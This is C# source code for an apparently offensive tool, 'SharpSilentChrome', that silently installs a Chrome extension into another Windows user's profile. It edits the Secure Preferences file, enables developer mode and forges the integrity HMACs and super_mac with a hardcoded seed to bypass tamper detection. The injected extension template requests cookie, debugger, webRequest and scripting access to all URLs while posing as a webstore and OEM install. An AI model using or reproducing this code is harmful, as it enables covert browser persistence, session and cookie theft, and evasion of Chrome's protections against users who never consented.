using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Security.Cryptography;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using static SharpSilentChrome.HmacUtils;

namespace SharpSilentChrome
{
    static class ChromeExtensionInstaller
    {
        public static string GetChromePreferencesPathFromSid(string sid)
        {
            try
            {
                string regPath = $@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}";
                object profileImagePath = Microsoft.Win32.Registry.GetValue(regPath, "ProfileImagePath", null);

                if (profileImagePath == null)
                {
                    Console.WriteLine($"[-] Could not find profile path for SID: {sid}");
                    return null;
                }

                string userProfilePath = profileImagePath.ToString();
                string securePrefsPath = Path.Combine(userProfilePath, @"AppData\Local\Google\Chrome\User Data\Default\Secure Preferences");
                string prefsPath = Path.Combine(userProfilePath, @"AppData\Local\Google\Chrome\User Data\Default\Preferences");

                Console.WriteLine($"[+] Found user profile: {userProfilePath}");
                Console.WriteLine($"[+] Found Chrome Secure Preferences path: {securePrefsPath}");
                Console.WriteLine($"[+] Found Chrome Preferences path: {prefsPath}");
                Console.WriteLine("");

                return userProfilePath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error resolving SID {sid}: {ex.Message}");
                return null;
            }
        }

        public static void InjectExtensionToFiles(string user, string sid, string extensionPath, string extensionId, string userProfilePath)
        {
            string securePrefsPath = Path.Combine(userProfilePath, @"AppData\Local\Google\Chrome\User Data\Default\Secure Preferences");
            string prefsPath = Path.Combine(userProfilePath, @"AppData\Local\Google\Chrome\User Data\Default\Preferences");

            // Try Secure Preferences first 
            if (File.Exists(securePrefsPath))
            {
                Console.WriteLine($"[+] Injecting extension to Secure Preferences: {securePrefsPath}");
                AddExtension(user, sid, extensionPath, extensionId, securePrefsPath);
            }
            else
            {
                Console.WriteLine($"[-] Secure Preferences file not found: {securePrefsPath}");
            }

            Console.WriteLine("");

            // Try Preferences second
            if (File.Exists(prefsPath))
            {
                Console.WriteLine($"[+] Injecting extension to Preferences: {prefsPath}");
                AddExtension(user, sid, extensionPath, extensionId, prefsPath);
            }
            else
            {
                Console.WriteLine($"[-] Preferences file not found: {prefsPath}");
            }
        }

        static void SafeSet(JObject parent, string key, JObject defaultValue, out JObject result)
        {
            if (parent[key] is JObject obj)
                result = obj;
            else
            {
                parent[key] = defaultValue;
                result = defaultValue;
            }
        }

        static void AddExtension(string user, string sid, string extensionPath, string extensionId, string securePrefsFilePath)
        {
            Console.WriteLine($"[+] Trimmed sid: {sid}");

            var escaped = JsonConvert.ToString(extensionPath).Trim('"');
            var template = GetExtensionTemplateJSON();
            var extJson = template.Replace("__EXTENSION_PATH__", escaped);
            var dictExt = JObject.Parse(extJson);

            var content = File.ReadAllText(securePrefsFilePath, Encoding.UTF8);
            var data = JObject.Parse(content);

            // Enable dev mode
            SafeSet(data, "extensions", new JObject(), out var ext);
            SafeSet(ext, "ui", new JObject(), out var ui);
            ui["developer_mode"] = true;

            // Add extension settings
            SafeSet(ext, "settings", new JObject(), out var settings);
            settings[extensionId] = dictExt;

            // MACs - exact same seed as Python
            var seed = new byte[] {
                0xe7, 0x48, 0xf3, 0x36, 0xd8, 0x5e, 0xa5, 0xf9, 0xdc, 0xdf, 0x25, 0xd8, 0xf3, 0x47, 0xa6, 0x5b,
                0x4c, 0xdf, 0x66, 0x76, 0x00, 0xf0, 0x2d, 0xf6, 0x72, 0x4a, 0x2a, 0xf1, 0x8a, 0x21, 0x2d, 0x26,
                0xb7, 0x88, 0xa2, 0x50, 0x86, 0x91, 0x0c, 0xf3, 0xa9, 0x03, 0x13, 0x69, 0x68, 0x71, 0xf3, 0xdc,
                0x05, 0x82, 0x37, 0x30, 0xc9, 0x1d, 0xf8, 0xba, 0x5c, 0x4f, 0xd9, 0xc8, 0x84, 0xb5, 0x05, 0xa8
            };

            //Console.WriteLine($"[DEBUG] Seed bytes: {BitConverter.ToString(seed)}");

            var path = $"extensions.settings.{extensionId}";
            var mac = CalculateHMAC(dictExt, path, sid, seed);

            SafeSet(data, "protection", new JObject(), out var protection);
            SafeSet(protection, "macs", new JObject(), out var macs);
            SafeSet(macs, "extensions", new JObject(), out var extMacs);
            SafeSet(extMacs, "settings", new JObject(), out var settingsMac);
            settingsMac[extensionId] = mac;
            Console.WriteLine($"[+] Extension HMAC: {mac}");

            var devMac = CalculateChromeDevMac(seed, sid, "extensions.ui.developer_mode", true);
            SafeSet(extMacs, "ui", new JObject(), out var uiMac);
            uiMac["developer_mode"] = devMac;
            Console.WriteLine($"[+] Dev mode protection HMAC: {devMac}");

            // Write once
            File.WriteAllText(securePrefsFilePath, data.ToString(Formatting.None), Encoding.UTF8);

            // Update super_mac
            var super = CalcSuperMac(securePrefsFilePath, sid, seed);
            protection["super_mac"] = super;
            File.WriteAllText(securePrefsFilePath, data.ToString(Formatting.None), Encoding.UTF8);
            Console.WriteLine($"[+] Super_MAC: {super}");
        }

        static string GetExtensionTemplateJSON()
        {
            return @"{
        ""active_permissions"": {
            ""api"": [
                ""activeTab"",
                ""cookies"",
                ""debugger"",
                ""webNavigation"",
                ""webRequest"",
                ""scripting""
            ],
            ""explicit_host"": [
                ""<all_urls>""
            ],
            ""manifest_permissions"": [],
            ""scriptable_host"": []
        },
        ""commands"": {},
        ""content_settings"": [],
        ""creation_flags"": 38,
        ""filtered_service_worker_events"": {
            ""webNavigation.onCompleted"": [
                {}
            ]
        },
        ""first_install_time"": ""13364417633506288"",
        ""from_webstore"": true,
        ""granted_permissions"": {
            ""api"": [
                ""activeTab"",
                ""cookies"",
                ""debugger"",
                ""webNavigation"",
                ""webRequest"",
                ""scripting""
            ],
            ""explicit_host"": [
                ""<all_urls>""
            ],
            ""manifest_permissions"": [],
            ""scriptable_host"": []
        },
        ""incognito_content_settings"": [],
        ""incognito_preferences"": {},
        ""last_update_time"": ""13364417633506288"",
        ""location"": 4,
        ""newAllowFileAccess"": true,
        ""path"": ""__EXTENSION_PATH__"",
        ""preferences"": {},
        ""regular_only_preferences"": {},
        ""service_worker_registration_info"": {
            ""version"": ""0.1.1""
        },
        ""serviceworkerevents"": [
            ""cookies.onChanged"",
            ""webRequest.onBeforeRequest/s1""
        ],
        ""state"": 1,
        ""was_installed_by_default"": true,
        ""was_installed_by_oem"": true,
        ""withholding_permissions"": true
        }";

        }
    }
}
